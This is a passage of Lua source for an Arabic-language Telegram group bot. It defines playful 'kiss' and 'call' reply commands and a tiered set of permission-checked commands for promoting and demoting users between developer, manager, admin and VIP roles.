Dev_Abs(msg.chat_id_, result.id_, 1,''..ABS_PROX[math.random(#ABS_PROX)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),bosha)   
end
end
if text:match("^بوسه$") or text:match("^بعد بوسه$") or text:match("^ضل بوس$") or text:match("^بوسه بعد$") then
function bosh(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح ابوس نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(bot_owner) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'مواححح احلاا بوسةة المطوريي😻🔥💗 '..SUDOUSERNAME..'', 1, 'md')
return false
end 
local ABS_PROX = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md') 
local ABS_PROX = {"مواححح افيـش عافيههه😍🔥💗","امممووااهحح شهلعسـل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
Dev_Abs(msg.chat_id_, result.id_, 1,''..ABS_PROX[math.random(#ABS_PROX)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),bosh)   
end
end
if text:match("^صيحه$") or text:match("^صيحها$") or text:match("^صيحهه$") then
function seha(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(bot_owner) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️ '..SUDOUSERNAME..'', 1, 'md')
return false
end 
local ABS_PROX = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md') 
local ABS_PROX = {"تتعـال ححـب محتاجيـك🙂🍭","تعال يولل استاذكك ايريدككك😒🔪","يمعوود تعـاال يريدوكك🤕♥️","تعـال لكك ديصيحـوك😐🖤"} 
Dev_Abs(msg.chat_id_, result.id_, 1,''..ABS_PROX[math.random(#ABS_PROX)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),seha)   
end
end
--     Source loolIQ     --
if text and text:match('^صيحه @(.*)')  then 
local username = text:match('^صيحه @(.*)') 
function ABS_PROX(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(bot_owner) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️ '..SUDOUSERNAME..'', 1, 'md') 
return false  
end  
local ABS_PROX = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md') 
local ABS_PROX = { "تتعـال ححـب @"..username.." محتاجيـك🙂🍭","تعال يولل @"..username.." استاذكك ايريدككك😒🔪","يمعوود @"..username.." تعـاال يريدوكك🤕♥️","تعـال لكك @"..username.." ديصيحـوك😐🖤",}
Dev_Abs(msg.chat_id_, result.id_, 1,''..ABS_PROX[math.random(#ABS_PROX)]..'', 1, 'html') 
else  
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ٱڵـعضو غير موجود في ٱڵـمجموعة', 1, 'md') 
end 
end 
resolve_username(username,ABS_PROX)
end
--     Source loolIQ     --
if is_sudo(msg) then
if text ==('رفع مطور ثالث') then
function sudo_reply(extra, result, success)
DevAbs:sadd(loolIQ..'abs:sudo3:',result.sender_user_id_)
setdev3(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and text:match('^رفع مطور ثالث @(.*)') then
local username = text:match('^رفع مطور ثالث @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(loolIQ..'abs:sudo3:',result.id_)
setdev3(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️📛 ⌯ ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مطور ثالث (%d+)') then
local user = text:match('رفع مطور ثالث (%d+)')
DevAbs:sadd(loolIQ..'abs:sudo3:',user)
setdev3(msg,msg.chat_id_,user)
end
----------------Rem Sudo3-----------
if text ==('تنزيل مطور ثالث') then
function prom_reply(extra, result, success)
DevAbs:srem(loolIQ..'abs:sudo3:',result.sender_user_id_)
deldev3(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مطور ثالث @(.*)') then
local username = text:match('^تنزيل مطور ثالث @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(loolIQ..'abs:sudo3:',result.id_)
deldev3(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️📛 ⌯ ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مطور ثالث (%d+)') then
local user = text:match('تنزيل مطور ثالث (%d+)')
DevAbs:srem(loolIQ..'abs:sudo3:',user)
deldev3(msg,msg.chat_id_,user)
end end
-----------Set Onall------------
if is_sudo3(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع مدير عام') then
function raf_reply(extra, result, success)
DevAbs:sadd(loolIQ..'abs:ownerall:',result.sender_user_id_)
setonall(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مدير عام @(.*)') then
local username = text:match('^رفع مدير عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(loolIQ..'abs:ownerall:',result.id_)
setonall(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️📛 ⌯ ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مدير عام (%d+)') then
local user = text:match('رفع مدير عام (%d+)')
DevAbs:sadd(loolIQ..'abs:ownerall:',user)
setonall(msg,msg.chat_id_,user)
end
----------------Rem Onall-----------
if text ==('تنزيل مدير عام') then
function prom_reply(extra, result, success)
DevAbs:srem(loolIQ..'abs:ownerall:',result.sender_user_id_)
delonall(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير عام @(.*)') then
local username = text:match('^تنزيل مدير عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(loolIQ..'abs:ownerall:',result.id_)
delonall(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️📛 ⌯ ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مدير عام (%d+)') then
local user = text:match('تنزيل مدير عام (%d+)')
DevAbs:srem(loolIQ..'abs:ownerall:',user)
delonall(msg,msg.chat_id_,user)
end end
-----------Set Moall------------
if is_ownerall(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع ادمن عام') then
function raf_reply(extra, result, success)
DevAbs:sadd(loolIQ..'abs:adminall:',result.sender_user_id_)
setmoall(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع ادمن عام @(.*)') then
local username = text:match('^رفع ادمن عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(loolIQ..'abs:adminall:',result.id_)
setmoall(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️📛 ⌯ ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع ادمن عام (%d+)') then
local user = text:match('رفع ادمن عام (%d+)')
DevAbs:sadd(loolIQ..'abs:adminall:',user)
setmoall(msg,msg.chat_id_,user)
end
----------------Rem Moall-----------
if text ==('تنزيل ادمن عام') then
function prom_reply(extra, result, success)
DevAbs:srem(loolIQ..'abs:adminall:',result.sender_user_id_)
delmoall(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن عام @(.*)') then
local username = text:match('^تنزيل ادمن عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(loolIQ..'abs:adminall:',result.id_)
delmoall(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️📛 ⌯ ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل ادمن عام (%d+)') then
local user = text:match('تنزيل ادمن عام (%d+)')
DevAbs:srem(loolIQ..'abs:adminall:',user)
delmoall(msg,msg.chat_id_,user)
end end
-----------Set Vipall------------
if is_adminall(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع مميز عام') then
function raf_reply(extra, result, success)
DevAbs:sadd(loolIQ..'abs:vipall:',result.sender_user_id_)
setvipall(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مميز عام @(.*)') then
local username = text:match('^رفع مميز عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(loolIQ..'abs:vipall:',result.id_)
setvipall(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️📛 ⌯ ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مميز عام (%d+)') then
local user = text:match('رفع مميز عام (%d+)')
DevAbs:sadd(loolIQ..'abs:vipall:',user)
setvipall(msg,msg.chat_id_,user)
end
----------------Rem Vipall-----------
if text ==('تنزيل مميز عام') then
function prom_reply(extra, result, success)
DevAbs:srem(loolIQ..'abs:vipall:',result.sender_user_id_)
delvipall(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز عام @(.*)') then
local username = text:match('^تنزيل مميز عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(loolIQ..'abs:vipall:',result.id_)
delvipall(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️📛 ⌯ ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مميز عام (%d+)') then
local user = text:match('تنزيل مميز عام (%d+)')
DevAbs:srem(loolIQ..'abs:vipall:',user)
delvipall(msg,msg.chat_id_,user)
end end
-----------Set Monsh------------
if is_vipall(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع منشئ اساسي') then
function raf_reply(extra, result, success)
DevAbs:sadd(loolIQ..'abs:monsh:'..msg.chat_id_,result.sender_user_id_)
setmonsh(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ اساسي @(.*)') then
local username = text:match('^رفع منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(loolIQ..'abs:monsh:'..msg.chat_id_,result.id_)
setmonsh(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️📛 ⌯ ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ اساسي (%d+)') then
local user = text:match('رفع منشئ اساسي (%d+)')
DevAbs:sadd(loolIQ..'abs:monsh:'..msg.chat_id_,user)
setmonsh(msg,msg.chat_id_,user)
end
----------------Rem Monsh-----------
if text ==('تنزيل منشئ اساسي') then
function prom_reply(extra, result, success)
DevAbs:srem(loolIQ..'abs:monsh:'..msg.chat_id_,result.sender_user_id_)
delmonsh(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ اساسي @(.*)') then
local username = text:match('^تنزيل منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(loolIQ..'abs:monsh:'..msg.chat_id_,result.id_)
delmonsh(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️📛 ⌯ ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ اساسي (%d+)') then
local user = text:match('تنزيل منشئ اساسي (%d+)')
DevAbs:srem(loolIQ..'abs:monsh:'..msg.chat_id_,user)
delmonsh(msg,msg.chat_id_,user)
end end
-----------Set Monsh2------------
if is_monsh(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع منشئ') then
function raf_reply(extra, result, success)
DevAbs:sadd(loolIQ..'abs:monshid:'..msg.chat_id_,result.sender_user_id_)
setmonsh2(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ @(.*)') then
local username = text:match('^رفع منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(loolIQ..'abs:monshid:'..msg.chat_id_,result.id_)
setmonsh2(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️📛 ⌯ ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ (%d+)') then
local user = text:match('رفع منشئ (%d+)')
DevAbs:sadd(loolIQ..'abs:monshid:'..msg.chat_id_,user)
setmonsh2(msg,msg.chat_id_,user)
end
----------------Rem Monsh2-----------
if text ==('تنزيل منشئ') then
function prom_reply(extra, result, success)
DevAbs:srem(loolIQ..'abs:monshid:'..msg.chat_id_,result.sender_user_id_)
delmonsh2(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ @(.*)') then
local username = text:match('^تنزيل منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(loolIQ..'abs:monshid:'..msg.chat_id_,result.id_)
delmonsh2(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️📛 ⌯ ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ (%d+)') then
local user = text:match('تنزيل منشئ (%d+)')
DevAbs:srem(loolIQ..'abs:monshid:'..msg.chat_id_,user)
delmonsh2(msg,msg.chat_id_,user)
end end
-----------Set Owner------------
if is_monshid(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع مدير') then
function prom_reply(extra, result, success)
DevAbs:sadd(loolIQ..'abs:owners:'..msg.chat_id_,result.sender_user_id_)
setowner(msg,msg.chat_id_,result.sender_user_id_)
end  
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مدير @(.*)') then
local username = text:match('^رفع مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(loolIQ..'abs:owners:'..msg.chat_id_,result.id_)
setowner(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️📛 ⌯ ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end 
if text and text:match('^رفع مدير (%d+)') then
local user = text:match('رفع مدير (%d+)')
DevAbs:sadd(loolIQ..'abs:owners:'..msg.chat_id_,user)
setowner(msg,msg.chat_id_,user)
end
----------------Rem Owner-----------
if text ==('تنزيل مدير') then
function prom_reply(extra, result, success)
DevAbs:srem(loolIQ..'abs:owners:'..msg.chat_id_,result.sender_user_id_)
delowner(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير @(.*)') then
local username = text:match('^تنزيل مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(loolIQ..'abs:owners:'..msg.chat_id_,result.id_)
delowner(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️📛 ⌯ ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مدير (%d+)') then
local user = text:match('تنزيل مدير (%d+)')
DevAbs:srem(loolIQ..'abs:owners:'..msg.chat_id_,user)
delowner(msg,msg.chat_id_,user)
end end
-----------Set Momod------------
if is_owner(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع ادمن') then
function prom_reply(extra, result, success)
DevAbs:sadd(loolIQ..'abs:admins'..msg.chat_id_,result.sender_user_id_)
setmomod(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع ادمن @(.*)') then
local username = text:match('^رفع ادمن @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(loolIQ..'abs:admins'..msg.chat_id_,result.id_)
setmomod(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️📛 ⌯ ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع ادمن (%d+)') then
local user = text:match('رفع ادمن (%d+)')
DevAbs:sadd(loolIQ..'abs:admins'..msg.chat_id_,user)
setmomod(msg,msg.chat_id_,user)
end
----------------Rem Momod-----------
if text ==('تنزيل ادمن') then
function prom_reply(extra, result, success)
DevAbs:srem(loolIQ..'abs:admins'..msg.chat_id_,result.sender_user_id_)
delmomod(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن @(.*)') then
local username = text:match('^تنزيل ادمن @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(loolIQ..'abs:admins'..msg.chat_id_,result.id_)
delmomod(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️📛 ⌯ ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل ادمن (%d+)') then
local user = text:match('تنزيل ادمن (%d+)')
DevAbs:srem(loolIQ..'abs:admins'..msg.chat_id_,user)
delmomod(msg,msg.chat_id_,user)
end end
-----------Set Vipmem------------
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع مميز') then
function prom_reply(extra, result, success)
DevAbs:sadd(loolIQ..'abs:vipmem'..msg.chat_id_,result.sender_user_id_)
setvipmem(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مميز @(.*)') then
local username = text:match('^رفع مميز @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(loolIQ..'abs:vipmem'..msg.chat_id_,result.id_)
setvipmem(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️📛 ⌯ ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مميز (%d+)') then
local user = text:match('رفع مميز (%d+)')
DevAbs:sadd(loolIQ..'abs:vipmem'..msg.chat_id_,user)
setvipmem(msg,msg.chat_id_,user)
end
----------------Rem Vipmem-----------
if text ==('تنزيل مميز') then
function prom_reply(extra, result, success)
DevAbs:srem(loolIQ..'abs:vipmem'..msg.chat_id_,result.sender_user_id_)
delvipmem(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز @(.*)') then
local username = text:match('^تنزيل مميز @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(loolIQ..'abs:vipmem'..msg.chat_id_,result.id_)
delvipmem(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️📛 ⌯ ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مميز (%d+)') then
local user = text:match('تنزيل مميز (%d+)')
DevAbs:srem(loolIQ..'abs:vipmem'..msg.chat_id_,user)
delvipmem(msg,msg.chat_id_,user)
end end 
-------- ------------------
if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and is_owner(msg.sender_user_id_, msg.chat_id_) then 
function promote_by_reply(extra, result, success)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
if is_leaderid(result.sender_user_id_) == true then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️📛 ⌯ لٱتستطيع تنزيڵ ٱڵمطور ٱلٱسٱسي", 1, 'md')
return false 
end end
if DevAbs:sismember(loolIQ..'abs:sudo3:',result.sender_user_id_) then
sudo3 = 'ٱڵمطورين • ' else sudo3 = '' end
if DevAbs:sismember(loolIQ..'abs:ownerall:',result.sender_user_id_) then
onall = 'ٱڵمدرٱء ٱڵعٱمين • ' else onall = '' end
if DevAbs:sismember(loolIQ..'abs:adminall:',result.sender_user_id_) then
moall = 'ٱلٱدمنية ٱڵعٱمين • ' else moall = '' end
if DevAbs:sismember(loolIQ..'abs:vipall:',result.sender_user_id_) then
vpall = 'ٱڵمميزين ٱڵعٱمين • ' else vpall = '' end
if DevAbs:sismember(loolIQ..'abs:monsh:'..msg.chat_id_, result.sender_user_id_) then
monsh = 'ٱڵمنشئين ٱلٱسٱسيين • ' else monsh = '' end
if DevAbs:sismember(loolIQ..'abs:monshid:'..msg.chat_id_, result.sender_user_id_) then
monsh2 = 'ٱڵمنشئين • ' else monsh2 = '' end 
if DevAbs:sismember(loolIQ..'abs:owners:'..msg.chat_id_, result.sender_user_id_) then
owner = 'ٱڵمدراء • ' else owner = '' end
if DevAbs:sismember(loolIQ..'abs:admins'..msg.chat_id_, result.sender_user_id_) then
momod = 'ٱلٱدمنية • ' else momod = '' end
if DevAbs:sismember(loolIQ..'abs:vipmem'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'ٱڵمميزين • ' else vipmem = ''
end
if absmasco(result.sender_user_id_,msg.chat_id_) ~= false then
Dev_Abs(msg.chat_id_, msg.id_, 1, "🎗 ⌯ ٱڵـمسخدم ⌯» ◝ ["..absc9.."] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ "..result.sender_user_id_.." ◟\n📣 ⌯ تـۖم تنزيڵه من ⌯» ⤈\n⌯ ( "..sudo3..''..onall..''..moall..''..vpall..''..monsh..''..monsh2..''..owner..''..momod..''..vipmem.." ) ⌯ \n🚸 ⌯ رتبته ٱلٱن { عضو فقط } \n ", 1, 'md')
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, "🎗 ⌯ ٱڵـعضو ⌯» ◝ ["..absc9.."] ◟ \n🚸 ⌯ ڵم تتم ترقيته مسبقٱ \n ", 1, 'md')
end
if masco(msg.sender_user_id_,msg.chat_id_) == 'botow' then
DevAbs:srem(loolIQ..'abs:sudo3:', result.sender_user_id_)
DevAbs:srem(loolIQ..'abs:ownerall:', result.sender_user_id_)
DevAbs:srem(loolIQ..'abs:adminall:', result.sender_user_id_)
DevAbs:srem(loolIQ..'abs:vipall:', result.sender_user_id_)
DevAbs:srem(loolIQ..'abs:monsh:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(loolIQ..'abs:monshid:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(loolIQ..'abs:owners:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(loolIQ..'abs:admins'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(loolIQ..'abs:vipmem'..msg.chat_id_, result.sender_user_id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'sudo3' then
DevAbs:srem(loolIQ..'abs:ownerall:', result.sender_user_id_)
DevAbs:srem(loolIQ..'abs:adminall:', result.sender_user_id_)
DevAbs:srem(loolIQ..'abs:vipall:', result.sender_user_id_)
DevAbs:srem(loolIQ..'abs:admins'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(loolIQ..'abs:vipmem'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(loolIQ..'abs:owners:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(loolIQ..'abs:monshid:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(loolIQ..'abs:monsh:'..msg.chat_id_,result.sender_user_id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'monsh' then
DevAbs:srem(loolIQ..'abs:admins'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(loolIQ..'abs:vipmem'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(loolIQ..'abs:owners:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(loolIQ..'abs:monshid:'..msg.chat_id_,result.sender_user_id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'monsh2' then
DevAbs:srem(loolIQ..'abs:admins'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(loolIQ..'abs:vipmem'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(loolIQ..'abs:owners:'..msg.chat_id_, result.sender_user_id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'owner' then
DevAbs:srem(loolIQ..'abs:admins'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(loolIQ..'abs:vipmem'..msg.chat_id_, result.sender_user_id_)
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end 
if text and text:match("^تنزيل الكل @(.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
local rem = {string.match(text, "^(تنزيل الكل) @(.*)$")}
function remm(extra, result, success)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. result.id_)
local absc9 = user_info_ if user_info_ then
if result.id_ then
if is_leaderid(result.id_) == true then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️📛 ⌯ لٱتستطيع تنزيڵ ٱڵمطور ٱلٱسٱسي", 1, 'md')
return false 
end end
if DevAbs:sismember(loolIQ..'abs:sudo3:',result.id_) then
sudo3 = 'ٱڵمطورين • ' else sudo3 = '' end
if DevAbs:sismember(loolIQ..'abs:ownerall:',result.id_) then
onall = 'ٱڵمدرٱء ٱڵعٱمين • ' else onall = '' end
if DevAbs:sismember(loolIQ..'abs:adminall:',result.id_) then
moall = 'ٱلٱدمنية ٱڵعٱمين • ' else moall = '' end
if DevAbs:sismember(loolIQ..'abs:vipall:',result.id_) then
vpall = 'ٱڵمميزين ٱڵعٱمين • ' else vpall = '' end
if DevAbs:sismember(loolIQ..'abs:monsh:'..msg.chat_id_, result.id_) then
monsh = 'ٱڵمنشئين ٱلٱسٱسيين • ' else monsh = '' end
if DevAbs:sismember(loolIQ..'abs:monshid:'..msg.chat_id_, result.id_) then
monsh2 = 'ٱڵمنشئين • ' else monsh2 = '' end 
if DevAbs:sismember(loolIQ..'abs:owners:'..msg.chat_id_, result.id_) then
owner = 'ٱڵمدرٱء • ' else owner = '' end
if DevAbs:sismember(loolIQ..'abs:admins'..msg.chat_id_, result.id_) then
momod = 'ٱلٱدمنية • ' else momod = '' end
if DevAbs:sismember(loolIQ..'abs:vipmem'..msg.chat_id_, result.id_) then
vipmem = 'ٱڵمميزين • ' else vipmem = ''
end
if absmasco(result.id_,msg.chat_id_) ~= false then
